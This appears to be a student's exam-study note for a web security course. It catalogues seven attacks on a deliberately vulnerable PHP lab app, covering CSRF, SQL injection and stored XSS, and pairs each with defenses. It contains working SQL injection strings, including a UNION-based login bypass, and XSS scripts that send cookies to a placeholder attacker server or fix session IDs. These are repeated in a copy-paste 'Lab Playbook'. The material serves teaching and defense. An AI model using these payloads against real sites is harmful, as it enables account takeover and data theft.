# Exam Study — Web Application Security

**Source PDF:** WebApplication_Security.pdf — CS451 Supplementary Slides (16 slides)  
**Course:** [[CS451 - Hub|CS451 – Network Security Fundamentals]]  
**Tags:** #CS451 #exam #web-security #CSRF #XSS #SQLinjection #session-hijacking #session-fixation

---

## Quick Lookup Index

**Sections:**
1. Security Analysis Workflow
2. Team Roles
3. SocialNet Application
4. Attack Catalog (Zero-Loss Extraction) — ATT-1 … ATT-7
5. Complete Attack Comparison Table
6. Defense Master Table
- Deep Dive: Why Parameterized Queries Defeat All Three SQL Attacks
- Deep Dive: Session Fixation vs Session Hijacking
- Lab Playbook (Copy-Paste)
- Knowledge Check Q&A

**Key Terms / Attacks:**
- **ATT-1** — CSRF / Broken Access Control: view unauthorized profile (`profile.php?owner=userX`)
- **ATT-2** — CSRF / Broken Access Control: add user via admin page (nginx Basic Auth fix)
- **ATT-3** — SQL Injection (form input, UPDATE): change any user's profile
- **ATT-4** — SQL Injection (query string, UNION SELECT): list all usernames
- **ATT-5** — SQL Injection (form input, UNION SELECT): login as any/non-existent user
- **ATT-6** — Stored XSS + cookie theft: session hijacking
- **ATT-7** — Stored XSS + cookie overwrite: session fixation

**Searchable keywords:** CSRF token (hashed), UNION SELECT, `AND 1=0`, `--` comment, `'` quote test, `document.cookie`, `document.location`, `PHPSESSID`, `HttpOnly`, `Secure`, `SameSite=Strict`, `session_regenerate_id(true)`, `PDO::prepare`, parameterized query, ModSecurity WAF, nginx `auth_basic` / `.htpasswd`, `password_verify`, bcrypt hash.

---

## 1. Security Analysis Workflow

Every software project must include three phases:

| Phase | Focus |
|---|---|
| **Project Development** | Implementing features |
| **Project Deployment & Testing** | Verifying features work correctly |
| **Project Security Analysis** | Discovering security vulnerabilities related to application features |

Security analysis is **not optional** — it is the mandatory third phase. Skipping it means shipping known-exploitable software.

**Operational model (mirrors real-world pen testing):**
- **Red Team** attacks the application.
- **Blue Team** defends it.

---

## 2. Team Roles

### Red Team

- Has access to the application **including source code** (white-box testing).
- Performs attack/exploitation and produces **detailed documentation** for each attack:
  - Attack name/code (e.g., ATT-1)
  - Attack vector specification: exact steps, preconditions, and context
  - Affected components, source code files, version
  - Can use security framework (MITRE ATT&CK) as guidelines
- Members can include community contributors (bounty hunters).

### Blue Team

- **Reactive protection**: receives exploit reports from Red Team and patches the vulnerabilities.
- **Proactive protection**: independently hardens the application before Red Team findings arrive.

---

## 3. SocialNet Application

SocialNet is a minimal PHP social network used as the attack target. Features:

- Account Registration
- Login / Logout
- Make Friend
- View profile page (**friends only** — this access control is the source of ATT-1)
- Admin page for user management

All 7 attacks exploit the gap between SocialNet's **intended** access control model and its **actual** implementation.

---

## 4. Attack Catalog (Zero-Loss Extraction)

### ATT-1: View Profile Page of Unauthorized User

| Property | Detail |
|---|---|
| **Attack vector** | Cross-Site Request Forgery (CSRF) — Broken Access Control |
| **Goal** | View a friend-only profile page without being a friend |
| **URL pattern exploited** | `http://server:port/socialnet/profile.php?owner=userX` |

**Exploitation steps:**
1. Login with a valid account (session user).
2. Identify the target's username (e.g., `userX`).
3. Directly navigate to the profile URL: `http://server:port/socialnet/profile.php?owner=userX`
4. The browser automatically sends the session cookie → server sees an authenticated request → serves the profile.

**Why it works:**
- The server only checks "is the user logged in?" — NOT "is the session user a friend of `userX`?"
- Browsers automatically attach cookies to any request for the matching domain, regardless of which page originated the request.
- Direct URL navigation is indistinguishable from a legitimate friend link.

**Prevention & Mitigation:**

| Defense | How It Works |
|---|---|
| **Friend check** | Server must verify: `is session_user in friend_list of owner?` before serving profile data |
| **CSRF token** | Generate a hashed token per session; embed in all profile links; validate server-side before serving |

**CSRF Token URL format:**
```
http://server:port/socialnet/profile.php?owner=userX&CSRF=<token>
```
- `<token>` is generated and validated **entirely server-side**.
- Token must be **hashed** to hide its generation logic — an exposed unhashed token allows an attacker to forge their own valid tokens.

---

### ATT-2: Add New User via Admin Page (in a Single Query)

| Property | Detail |
|---|---|
| **Attack vector** | Cross-Site Request Forgery (CSRF) — Broken Access Control |
| **Goal** | Perform admin operations without admin credentials |

**Exploitation steps:**
1. **Step 1**: Analyze the admin page to find the request pattern (URL, method, parameters) for user creation.
2. **Step 2**: Craft a request matching that pattern and submit it directly from an authenticated browser session.

**Why it works:**
- The admin endpoint performs state-changing operations (creating users) accessible via URL.
- Without authentication/authorization on the admin endpoint itself, any authenticated session can submit admin-level requests.

**Prevention & Mitigation:**

| Defense | Implementation |
|---|---|
| **nginx Basic Authentication** | Add HTTP Basic Auth to the admin location block — requires a separate admin-layer password before the admin page is served at all |
| **IP allowlist** | Restrict admin endpoint access to internal network IPs only |

**nginx Basic Authentication config:**
```nginx
location /admin {
    auth_basic "Admin Area";
    auth_basic_user_file /etc/nginx/.htpasswd;
}
```

---

### ATT-3: Change Profile Page of Any User

| Property | Detail |
|---|---|
| **Attack vector** | SQL Injection — form input exploitation |
| **Goal** | Unauthorized modification of any user's profile data |

**Exploitation steps:**
1. **Step 1**: Login with a valid account.
2. **Step 2**: Identify the victim user account in the system.
3. **Step 3**: Open the profile settings page and craft a SQL injection payload in the form fields (exact payload depends on the server implementation).
4. Submit the form → the injected SQL modifies the database record for an arbitrary user.

**Why it works:**
The profile update handler concatenates unsanitized form input directly into the SQL query string:

```sql
-- Intended: update only the session user's record
UPDATE account SET fullname='John' WHERE username='session_user'

-- With injection in the fullname field (e.g., "hacked' WHERE username='victim";--):
UPDATE account SET fullname='hacked' WHERE username='victim';-- WHERE username='session_user'
-- Result: victim's record is modified, not the session user's
```

**Prevention:**
- **Parameterized query** (prepared statement): query structure is compiled before user input is bound as data — SQL metacharacters are never interpreted as SQL syntax.

```php
$stmt = $pdo->prepare("UPDATE account SET fullname=?, gender=? WHERE username=?");
$stmt->execute([$fullname, $gender, $_SESSION['username']]);
```

---

### ATT-4: List All Usernames in the System

| Property | Detail |
|---|---|
| **Attack vector** | SQL Injection — query string exploitation, **UNION query attack** |
| **Goal** | Full disclosure of all usernames (and potentially all data) in the database |

**Exploitation steps:**
1. **Step 1**: Open a profile page that uses an `owner` parameter in the URL query string (e.g., `profile.php?owner=user1`). Verify the parameter is injectable by testing with a single quote (`'`) — a server error confirms vulnerability.
2. **Step 2**: Craft a UNION injection payload (exact format depends on server implementation):

```sql
-- Appended to the URL: ?owner=user1 UNION SELECT username,2,3,4 FROM account --
```

**How UNION injection works:**
- The original query returns one result for `owner=user1`.
- `UNION SELECT username,2,3,4 FROM account` appends ALL usernames from the account table to the result set.
- The `--` comments out anything after the injection in the original query.
- The application renders all rows — attacker reads all usernames from the page.

**Prevention:**

| Defense | Description |
|---|---|
| **Parameterized query** | Makes UNION injection impossible — input is treated as data |
| **Input sanitized checking** | Reject inputs containing SQL metacharacters (`'`, `--`, `UNION`, `;`) |
| **ModSecurity (WAF)** | Web Application Firewall (nginx/Apache + OWASP ModSecurity) that inspects requests and blocks known SQL injection signatures |

---

### ATT-5: Login to Any User Account / Login as a User That Does Not Exist

| Property | Detail |
|---|---|
| **Attack vector** | SQL Injection — form input exploitation + UNION query |
| **Goal** | Full authentication bypass for any account (even non-existent ones) |

**Exploitation steps:**
1. **Step 1**: Open the signin page.
2. **Step 2**: Generate a bcrypt hash for a chosen password (e.g., `abc123`). Copy it.
3. **Step 3**: In the username field, enter the UNION injection payload:
   ```
   " AND 1=0 UNION SELECT 'user5','your_bcrypt_hash' -- 
   ```
   In the password field, enter `abc123`.
4. Press Login.

**Why it works:**

The login query is typically:
```sql
SELECT username, password FROM account WHERE username='$input_username'
```

The injected payload:
```sql
SELECT username, password FROM account WHERE username='"' AND 1=0 UNION SELECT 'user5','your_hash' -- '
```

- `AND 1=0` → the original WHERE clause **always returns nothing** (no real user fetched).
- `UNION SELECT 'user5','your_hash'` → injects a **fabricated row** with the attacker's chosen username and hash.
- Server receives the fabricated row, runs `password_verify('abc123', 'your_hash')` → **TRUE**.
- Server logs the attacker in as `user5` — a user that may not even exist in the database.

> **Critical insight**: UNION injection can authenticate as a **completely fabricated user** — no real account in the database is needed.

**Prevention:**
- Parameterized queries.

---

### ATT-6: Hijack a Login Session (Stored XSS + Cookie Theft)

| Property | Detail |
|---|---|
| **Attack vector** | Social Engineering + Stored XSS + Session Hijacking |
| **Goal** | Full account takeover for any victim who views the attacker's profile |

**Prerequisites — Understanding cookies and sessions:**

**Cookies:**
- Server sends `Set-Cookie` header in HTTP response → browser stores cookie keyed by domain (and port).
- Browser **automatically** sends the cookie in the `Cookie` header of **every** subsequent request to that domain.

**Sessions (PHPSESSID):**
- Session = server-side storage space for a browser session.
- Session keyed by `sessionID` (`PHPSESSID`), stored on the server.
- `PHPSESSID` transmitted to browser as a cookie.
- Browser auto-sends `PHPSESSID` on every request → server loads corresponding session data → client state is restored.

**Exploitation steps:**
1. **Step 1**: Write a malicious JavaScript script and embed it as the content of your profile page (Stored XSS — script is stored in the DB and executed by every visitor):
   ```javascript
   document.location = 'http://attacker-server/grab?cookie=' + document.cookie
   ```
2. **Step 2**: Set up a **data grabber server** that reads the `cookie` parameter and saves it to a file (e.g., using `$_GET['cookie']` in PHP).
3. **Step 3**: Wait for a victim to view your profile page. Their browser executes the script and sends their `PHPSESSID` to the attacker's server.
4. **Step 4**: Copy the captured `PHPSESSID` from the saved file.
5. **Step 5**: Set the copied cookie in your browser (Browser DevTools → Application → Cookies → manually set `PHPSESSID`).
6. Reload the target site → you are now authenticated as the victim.

**Why it works:**
- The profile page does **not sanitize** stored content before rendering it.
- The victim's browser trusts all JavaScript on the page and executes the attacker-injected script.
- `document.cookie` is readable by JavaScript (no `HttpOnly` flag set) → session token is extracted.

**Prevention:**

| Defense | Defeats |
|---|---|
| **Sanitize output** (HTML-encode `<`, `>`, `"`, `&`) | Removes the XSS vector entirely |
| **`HttpOnly` flag on session cookie** | Prevents JavaScript from reading `document.cookie` — XSS cannot steal the session ID |
| **`Secure` flag** | Cookies only sent over HTTPS — prevents network interception |
| **`SameSite=Strict`** | Prevents cookie transmission in cross-site requests |

---

### ATT-7: Access a Logged-In Session via Session Fixation

| Property | Detail |
|---|---|
| **Attack vector** | Social Engineering + Stored XSS + Session Fixation |
| **Goal** | Account takeover **without ever stealing a cookie** |

**How it differs from ATT-6:**
- ATT-6: **steals** the victim's existing session ID.
- ATT-7: **fixes** the victim's session ID to one the attacker chose in advance — no interception needed.

**Exploitation steps:**
1. **Step 1**: Write a Stored XSS script in your profile page that **overwrites** the victim's `PHPSESSID` cookie with the attacker's known session ID:
   ```javascript
   document.cookie = 'PHPSESSID=attacker_known_session_id; path=/'
   ```
2. **Step 2**: **Log out** of your own session (so `attacker_known_session_id` is not yet authenticated).
3. **Step 3**: Wait for a victim to view your profile page. The XSS script fires → overwrites the victim's `PHPSESSID` with the attacker's session ID → victim is immediately logged out (since the attacker's session is not authenticated).
4. **Step 4**: The victim, confused, logs in again — **using the attacker's session ID** (which is now set in their browser cookie).
5. **Step 5**: The server authenticates the login and marks `attacker_known_session_id` as an authenticated session for the victim's account. The attacker loads the page with that session ID → is now logged in as the victim.

**Prevention:**

| Defense | Why It Works |
|---|---|
| **`session_regenerate_id(true)` on login** | Generates a NEW session ID on successful login — any pre-fixed session ID is invalidated; the attacker's known session ID no longer corresponds to the authenticated session |
| **`HttpOnly` flag** | Prevents XSS from overwriting `PHPSESSID` via `document.cookie` |
| **Output sanitization** | Removes the XSS vector entirely (no script runs → no cookie overwrite) |

---

## 5. Complete Attack Comparison Table

| Attack | Root Vulnerability Class | Vector | Goal |
|---|---|---|---|
| **ATT-1** | Broken Access Control | CSRF — URL navigation | View unauthorized profile |
| **ATT-2** | Broken Access Control | CSRF — admin endpoint | Perform admin operations without credentials |
| **ATT-3** | SQL Injection | Form input — UPDATE | Modify any user's profile data |
| **ATT-4** | SQL Injection | Query string — UNION SELECT | List all usernames in database |
| **ATT-5** | SQL Injection | Form input — UNION SELECT | Log in as any user (including non-existent) |
| **ATT-6** | Stored XSS | Profile page script → cookie theft | Full account takeover via session hijacking |
| **ATT-7** | Stored XSS | Profile page script → cookie overwrite | Full account takeover via session fixation |

---

## 6. Defense Master Table

| Defense | Attacks It Defeats |
|---|---|
| **Friend check before serving profile** | ATT-1 |
| **CSRF token (hashed, server-generated)** | ATT-1, ATT-2 |
| **nginx Basic Authentication on admin** | ATT-2 |
| **Parameterized queries (PDO::prepare)** | ATT-3, ATT-4, ATT-5 |
| **Input sanitized checking** | ATT-4 |
| **ModSecurity WAF** | ATT-4 |
| **Output sanitization (HTML encoding)** | ATT-6, ATT-7 (removes XSS vector) |
| **`HttpOnly` flag on session cookie** | ATT-6 (blocks `document.cookie` read) |
| **`session_regenerate_id(true)` on login** | ATT-7 (invalidates fixed session ID) |
| **`Secure` flag on cookie** | ATT-6, ATT-7 (HTTPS only) |
| **`SameSite=Strict` on cookie** | ATT-1, ATT-2, ATT-6 (cross-site request blocking) |

---

## Deep Dive: Why Parameterized Queries Defeat All Three SQL Attacks

A **parameterized query** (prepared statement) separates SQL *structure* from *data*:

```php
// VULNERABLE: string concatenation — user input becomes SQL
$query = "SELECT * FROM account WHERE username='" . $username . "'";

// SAFE: parameterized — user input is always treated as data
$stmt = $pdo->prepare("SELECT * FROM account WHERE username=?");
$stmt->execute([$username]);
```

In the safe version:
- The DB driver compiles the query structure **first**.
- When `$username` is provided, it is bound as a **value** — SQL metacharacters (`'`, `--`, `UNION`, `;`) inside it are **never interpreted as SQL syntax**.
- UNION injection (ATT-4, ATT-5), form injection (ATT-3), and query string injection are all neutralized by this **single change**.

---

## Deep Dive: Session Fixation vs Session Hijacking

| Aspect | ATT-6: Session Hijacking | ATT-7: Session Fixation |
|---|---|---|
| **What attacker does** | Steals victim's existing PHPSESSID | Sets victim's PHPSESSID to attacker's chosen value in advance |
| **When attacker acts** | After victim logs in | Before victim logs in |
| **What attacker needs** | XSS to execute `document.cookie` read | XSS to execute `document.cookie` write |
| **What makes it work** | No `HttpOnly` flag → cookie is readable by JS | No `session_regenerate_id()` on login → pre-set session ID becomes authenticated |
| **Defense** | `HttpOnly` flag + output sanitization | `session_regenerate_id(true)` on login + output sanitization |

> **Session fixation is more dangerous** because the attacker controls the session ID **before** authentication — no real-time interception needed, and the victim actively participates (logs in with the attacker's chosen session ID).

---

## Knowledge Check Q&A

**Q1**: What is the exact URL an attacker uses in ATT-1 to view `userX`'s profile without being a friend?  
**A**: `http://server:port/socialnet/profile.php?owner=userX` — navigating directly to this URL sends the session cookie automatically, bypassing the friend check if the server doesn't verify the friendship relationship.

**Q2**: What is the ATT-5 payload entered in the username field?  
**A**: `" AND 1=0 UNION SELECT 'user5','your_bcrypt_hash' -- ` — this makes the original WHERE clause return nothing (`AND 1=0`) and injects a fabricated row with the attacker's chosen username and a hash they control.

**Q3**: Why must the CSRF token be hashed?  
**A**: To hide the token generation logic. If the token is unhashed (e.g., just a combination of session ID + timestamp), an attacker who observes valid tokens can reverse-engineer the generation formula and forge their own valid tokens.

**Q4**: What is the exact JavaScript script used in ATT-6?  
**A**: `document.location = 'http://attacker-server/grab?cookie=' + document.cookie` — embedded in the attacker's profile page; sends the victim's cookies (including PHPSESSID) to the attacker's server when the victim views the profile.

**Q5**: What is the exact JavaScript script used in ATT-7?  
**A**: `document.cookie = 'PHPSESSID=attacker_known_session_id; path=/'` — overwrites the victim's PHPSESSID with the attacker's pre-chosen session ID.

**Q6**: Why does ATT-7 require the attacker to log out before the victim views the profile?  
**A**: If the attacker stays logged in, `attacker_known_session_id` is already authenticated as the attacker's account. The victim viewing the profile would immediately be logged in as the attacker. By logging out first, the session ID is unauthenticated — the victim logs in and authenticates it as their own account, then the attacker can use it.

**Q7**: What single PHP function call defeats ATT-7, and when must it be called?  
**A**: `session_regenerate_id(true)` must be called **immediately after successful login verification** — before storing any session data. This generates a new PHPSESSID, making the pre-fixed session ID invalid.

---

## Lab Playbook (Copy-Paste)

All payloads VERBATIM. Each labeled by attack + one-line "what it does".

**ATT-1 — CSRF / Broken Access Control: view a friend-only profile without being a friend.**
Directly navigate to the profile URL (browser auto-sends session cookie):
```
http://server:port/socialnet/profile.php?owner=userX
```
CSRF-token URL format (token generated + validated server-side, must be hashed):
```
http://server:port/socialnet/profile.php?owner=userX&CSRF=<token>
```

**ATT-2 — CSRF / Broken Access Control: add a new user via admin endpoint without admin credentials.**
Analyze the admin page request pattern (URL, method, params for user creation), then submit that request directly from an authenticated session. Defense (nginx Basic Auth on admin location):
```nginx
location /admin {
    auth_basic "Admin Area";
    auth_basic_user_file /etc/nginx/.htpasswd;
}
```

**ATT-3 — SQL Injection (form input, UPDATE): modify any user's profile.**
Inject into the `fullname` form field (closes string + retargets WHERE + comments rest):
```
hacked' WHERE username='victim';--
```
Resulting query:
```sql
UPDATE account SET fullname='hacked' WHERE username='victim';-- WHERE username='session_user'
```

**ATT-4 — SQL Injection (query string, UNION SELECT): list all usernames.**
First confirm the param is injectable with a single quote (server error = vulnerable):
```
'
```
UNION payload appended to the URL `owner` parameter:
```
?owner=user1 UNION SELECT username,2,3,4 FROM account --
```

**ATT-5 — SQL Injection (form input, UNION SELECT): login as any/non-existent user.**
Generate a bcrypt hash for a chosen password (e.g. `abc123`). Enter in the **username** field:
```
" AND 1=0 UNION SELECT 'user5','your_bcrypt_hash' -- 
```
Enter in the **password** field: `abc123`. Resulting query:
```sql
SELECT username, password FROM account WHERE username='"' AND 1=0 UNION SELECT 'user5','your_hash' -- '
```
`AND 1=0` voids the real row; UNION injects a fabricated `user5` row with attacker's hash → `password_verify('abc123','your_hash')` = TRUE.

**ATT-6 — Stored XSS + cookie theft → session hijacking.**
Store this JS as profile content; it exfiltrates the viewer's cookies (incl. PHPSESSID) to the attacker server:
```javascript
document.location = 'http://attacker-server/grab?cookie=' + document.cookie
```
Then set the stolen PHPSESSID in your browser (DevTools → Application → Cookies → set `PHPSESSID`) and reload → logged in as victim. Defeated by `HttpOnly` flag + output sanitization.

**ATT-7 — Stored XSS + cookie overwrite → session fixation.**
Store this JS as profile content; it overwrites the viewer's PHPSESSID with the attacker's pre-chosen, unauthenticated session ID:
```javascript
document.cookie = 'PHPSESSID=attacker_known_session_id; path=/'
```
Attacker logs out first; victim is logged out, logs in again on attacker's session ID → attacker reuses that ID as the victim. Defeated by `session_regenerate_id(true)` on login + `HttpOnly` + output sanitization.

**Defensive code patterns:**
```php
// Parameterized query — defeats ATT-3/4/5
$stmt = $pdo->prepare("SELECT * FROM account WHERE username=?");
$stmt->execute([$username]);

$stmt = $pdo->prepare("UPDATE account SET fullname=?, gender=? WHERE username=?");
$stmt->execute([$fullname, $gender, $_SESSION['username']]);
```
Secure session cookie flags: `HttpOnly; Secure; SameSite=Strict`. Call `session_regenerate_id(true)` on every successful login.

---

## Graph View Links

**Previous**: [[Supplementary - Web Application Development]]  
**Next**: —  
**Hub**: [[CS451 - Hub]]  
**Source Notes**: [[Supplementary - Web Application Security]]
